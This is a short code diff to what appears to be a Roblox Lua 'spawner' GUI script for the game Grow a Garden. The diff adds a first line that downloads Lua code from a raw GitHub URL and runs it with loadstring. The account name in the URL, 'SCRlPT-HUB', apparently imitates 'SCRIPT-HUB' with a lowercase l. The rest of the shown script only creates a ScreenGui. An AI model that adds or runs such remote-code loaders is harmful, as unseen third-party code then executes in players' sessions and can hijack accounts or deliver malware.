@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/AdrianScripts_Hub/refs/heads/main/GrowAGarden_AdrianHub"))()
+
 local player = game.Players.LocalPlayer
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "AdrianSpawnerGUI"
